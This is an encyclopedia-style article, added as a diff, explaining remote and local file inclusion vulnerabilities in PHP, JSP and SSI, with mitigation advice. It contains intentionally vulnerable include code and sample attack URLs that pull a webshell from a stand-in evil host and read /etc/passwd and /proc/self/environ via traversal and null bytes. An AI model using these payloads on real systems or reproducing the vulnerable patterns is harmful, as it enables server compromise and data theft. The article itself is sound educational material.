@@ -1,0 +1,89 @@
+Title: File inclusion vulnerability
+
+A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time.  A file include vulnerability is distinct from a generic directory traversal attack, in that directory traversal is a way of gaining unauthorized file system access, and a file inclusion vulnerability subverts how an application loads code for execution.  Successful exploitation of a file inclusion vulnerability will result in remote code execution on the web server that runs the affected web application. An attacker can use remote code execution to create a web shell on the web server, which can be used for website defacement.
+
+Types of Inclusion
+
+Remote file inclusion 
+Remote file inclusion (RFI) occurs when the web application downloads and executes a remote file.  These remote files are usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application.
+
+Local file inclusion 
+Local file inclusion (LFI) is similar to a remote file inclusion vulnerability except instead of including remote files, only local files i.e. files on the current server can be included for execution.  This issue can still lead to remote code execution by including a file that contains attacker-controlled data such as the web server's access logs.
+
+Programming languages
+
+PHP
+In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution. Most notable are the include and require statements. Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled, allows filesystem functions to use a URL to retrieve data from remote locations. The directive is allow_url_fopen in PHP versions <= 4.3.4 and allow_url_include since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default. To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource. To mitigate this vulnerability all user input needs to be validated before being used.
+
+Example
+
+Consider this PHP script which includes a file specified by request:
+<?php
+if (isset($_GET['language'])) {
+    include($_GET['language'] . '.php');
+}
+?>
+
+<form method="get">
+   <select name="language">
+      <option value="english">English</option>
+      <option value="french">French</option>
+      ...
+   </select>
+   <input type="submit">
+</form>
+
+The developer intended to read in english.php or french.php, which will alter the application's behavior to display the language of the user's choice. But it is possible to inject another path using the language parameter.
+ /vulnerable.php?language=http://evil.example.com/webshell.txt? - injects a remotely hosted file containing a malicious code (remote file include)
+ /vulnerable.php?language=C:\\ftp\\upload\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)
+ /vulnerable.php?language=C:\\notes.txt%00 - example using NULL meta character to remove the .php suffix, allowing access to files other than .php. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.
+ /vulnerable.php?language=../../../../../etc/passwd%00 - allows an attacker to read the contents of the /etc/passwd file on a Unix-like system through a directory traversal attack.
+ /vulnerable.php?language=../../../../../proc/self/environ%00  - allows an attacker to read the contents of the /proc/self/environ file on a Unix-like system through a directory traversal attack. An attacker can modify a HTTP header (such as User-Agent) in this attack to be PHP code to exploit remote code execution.
+
+The best solution in this case is to use a whitelist of accepted language parameters.  If a strong method of input validation such as a whitelist cannot be used, then rely upon input filtering or validation of the passed-in path to make sure it does not contain unintended characters and character patterns. However, this may require anticipating all possible problematic character combinations. A safer solution is to use a predefined Switch/Case statement to determine which file to include rather than use a URL or form parameter to dynamically generate the path.
+
+JavaServer Pages (JSP) 
+JavaServer Pages (JSP) is a scripting language which can include files for execution at runtime.
+
+Example 
+The following script is vulnerable to a file inclusion vulnerability:
+<%
+   String p = request.getParameter("p");
+   @include file="<%="includes/" + p +".jsp"%>"
+%>
+ /vulnerable.jsp?p=../../../../var/log/access.log%00 - Unlike PHP, JSP is still affected by Null byte injection, and this param will execute JSP commands found in the web server's access log.
+
+Server Side Includes (SSI) 
+A Server Side Include is very uncommon and are not typically enabled on a default web server. A server-side include can be used to gain remote code execution on a vulnerable web server.
+
+Example 
+The following code is vulnerable to a remote-file inclusion vulnerability:
+<!DOCTYPE html>
+<html>
+<head>
+<title>Test file</title>
+</head>
+<body>
+<!--#include file="USER_LANGUAGE"-->
+</body>
+</html>
+The above code is not an XSS vulnerability,  but rather including a new file to be executed by the server.
+
+See also
+ Attack (computing)
+ Code injection
+ Metasploit Project, an open-source penetration testing tool that includes tests for RFI
+ SQL injection
+ Threat (computer)
+ w3af, an open-source web application security scanner
+ Default Credential vulnerability
+
+References
+
+External links
+Remote File Inclusion at the Web Application Security Consortium
+Local File Inclusion
+Local & Remove File Inclusion WordPress at WP Hacked Help
+
+Injection exploits
+Web security exploits
